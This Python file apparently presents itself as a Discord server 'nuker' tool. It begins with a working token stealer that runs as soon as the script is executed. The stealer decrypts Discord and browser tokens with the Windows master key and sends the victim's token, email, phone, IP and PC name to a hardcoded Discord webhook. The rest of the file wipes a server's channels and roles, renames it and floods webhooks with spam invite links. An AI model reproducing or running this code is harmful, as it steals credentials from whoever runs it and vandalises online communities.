import asyncio
import aiohttp
import sys
import requests
import json
import threading
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime

tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        embed = f"""**{user_name}** *({user_id})*

> :dividers: __Account Information__
	Email: `{email}`
	Phone: `{phone}`
	2FA/MFA Enabled: `{mfa_enabled}`
	Nitro: `{has_nitro}`
	Expires in: `{days_left if days_left else "None"} day(s)`

> :computer: __PC Information__
	IP: `{ip}`
	Username: `{pc_username}`
	PC Name: `{pc_name}`
	Platform: `{platform}`

> :piñata: __Token__
	`{tok}`

*Made by JoNe* **|** ||https://github.com/JoNe-00||"""
                        payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by JoNe', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                        try:
                            headers2 = {
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                            }
                            req = Request('https://discord.com/api/webhooks/1378476668481699880/1vSA5gDWt_X86y_nqVwR3mJM-nd0-wtI8XfzxdL_d2gSzt9SY6-P-SyFVlVoHmqd-9xS', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue
if __name__ == '__main__':
    get_token()

with open("token.txt", "r") as file:
    token = file.readline().strip()
    if token == "":
        print("Empty token")
        print("Ignore the error below i dont know how to fix it if you know how to fix it create a pull request")
        sys.exit(1)
    elif token == "single token here":
        print("You havent edited the file 'token.txt'.")
        print("Ignore the error below i dont know how to fix it if you know how to fix it create a pull request")
        sys.exit(1)
    headers = {'Authorization': f'Bot {token}'}
print("This will only work with bot tokens")
guild_id = input("Guild ID? ")
themessage = input("Enter message [Enter for default]: ")
if themessage == "":
    themessage = "@everyone\n**JoNe is here** \n\n"
sname = input("Enter new server name [Enter for default]: ")
if sname == "":
    sname = "JoNe is here "
num_channels = 50
num_messages = 41
num_roles = 40

total_messages_sent = 0

async def start_bot():
    headers = {'Authorization': f'Bot {token}'}
    async with aiohttp.ClientSession(headers=headers) as session:
        await delete_all_roles(session)
        await create_roles(session)
        guild_url = f'https://discord.com/api/v9/guilds/{guild_id}'
        await delete_all_channels(session)
        await change_server_name(session, sname)
        await create_channels_and_spam(session)

async def delete_all_channels(session):
    print("Deleting channels...")
    url = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
    async with session.get(url) as response:
        if response.status == 200:
            channels = await response.json()
            delete_tasks = []
            for channel in channels:
                channel_id = channel['id']
                delete_url = f'https://discord.com/api/v9/channels/{channel_id}'
                delete_tasks.append(session.delete(delete_url))
            await asyncio.gather(*delete_tasks)
            print("Deleted all channels.")
        else:
            print("Failed to retrieve channels")

async def delete_all_roles(session):
    print("Deleting roles...")
    roles_url = f'https://discord.com/api/v9/guilds/{guild_id}/roles'
    async with session.get(roles_url) as response:
        if response.status == 200:
            roles = await response.json()
            delete_tasks = []
            delete_count = 0
            for role in roles:
                role_id = role['id']
                if role_id != guild_id and delete_count < len(roles) - num_roles:
                    delete_url = f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}'
                    delete_tasks.append(session.delete(delete_url))
                    delete_count += 1
            await asyncio.gather(*delete_tasks)
            print(f"Deleted {delete_count} roles")
        else:
            print("Failed to retrieve roles")

async def create_roles(session):
    print("Creating roles...")
    rname = "b2y GRoup#31"
    create_role_url = f'https://discord.com/api/v9/guilds/{guild_id}/roles'
    create_role_payload = {
        'name': f'{rname}',
        'color': 0xFF0000,
        'hoist': True,
        'mentionable': True
    }
    create_tasks = []
    for _ in range(num_roles):
        create_tasks.append(session.post(create_role_url, json=create_role_payload))
    create_responses = await asyncio.gather(*create_tasks)
    print("Made a shit ton of roles")

async def create_channel_and_spam(session, create_channel_url, create_channel_payload, create_webhook_url, create_webhook_payload):
    global total_messages_sent

    async with session.post(create_channel_url, headers=headers, json=create_channel_payload) as create_response:
        if create_response.status == 201:
            channel = await create_response.json()
            channel_id = channel['id']
            
            retry_attempts = 10
            for attempt in range(retry_attempts):
                create_webhook_response = await session.post(create_webhook_url.format(channel_id=channel_id), headers=headers, json=create_webhook_payload)
                if create_webhook_response.status == 200:
                    webhook = await create_webhook_response.json()
                    webhook_url = webhook['url']
                    print(f"Created Webhook: {webhook_url}")
                    
                    messages_sent = await spam_webhook(session, webhook_url)
                    total_messages_sent += messages_sent
                    break
                else:
                    print(f"Failed to create webhook for channel: {channel_id}. Retrying ({attempt + 1}/{retry_attempts})...")
                    await asyncio.sleep(0.7)
            else:
                print(f"Failed to create webhook for channel: {channel_id} after {retry_attempts} attempts.")

        else:
            print("Failed to create channel")


async def create_channels_and_spam(session):
    print("Creating channels and webhooks...")
    headers = {
        'Content-Type': 'application/json'
    }
    create_channel_url = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
    create_channel_payload = {
        'name':'b2y-GRoup#31' , 
        'type': 0 
            

}  
 


    create_webhook_url = f'https://discord.com/api/v9/channels/{{channel_id}}/webhooks'
    create_webhook_payload = {
        'name': 'why are you looking at the webhook name | JoNe Bot',
    }

    create_tasks = []
    for _ in range(num_channels):
        create_task = asyncio.ensure_future(create_channel_and_spam(session, create_channel_url, create_channel_payload, create_webhook_url, create_webhook_payload))
        create_tasks.append(create_task)

    await asyncio.gather(*create_tasks)

    print(f"Total messages sent: {total_messages_sent}")


async def change_server_name(session, sname):
    print("Changing server name...")
    url = f'https://discord.com/api/v9/guilds/{guild_id}'
    headers = {
        'Content-Type': 'application/json'
    }
    payload = {
        'name': sname
    }
    async with session.patch(url, headers=headers, json=payload) as response:
        if response.status == 200:
            print(f"Server name changed to: {sname}")
        else:
            print("Failed to change server name")

async def spam_webhook(session, webhook_url):
    messages_sent = 0

    message = {
        "content": f"{themessage}",
        'username': 'GRoup#31 Bot',
        "avatar_url": "https://cdn.discordapp.com/emojis/1376732763746603112.webp?size=80",
        "components": [
            {
                "type": 1,
                "components": [
                    {
                        "type": 2,
                        "style": 5,
                        "label": "Download",
                        "url": "https://discord.gg/kc24AeUhuy"
                    }
                ]
            }
        ]
    }

    while messages_sent < num_messages:
        async with session.post(webhook_url, json=message) as response:
            if response.status == 204:
                print(f"Sent: {webhook_url}")
                messages_sent += 1

        print(f"Retrying: {webhook_url}")

    return messages_sent

asyncio.run(start_bot())
#cHJvcGVydHkgb2YgYTFsdw
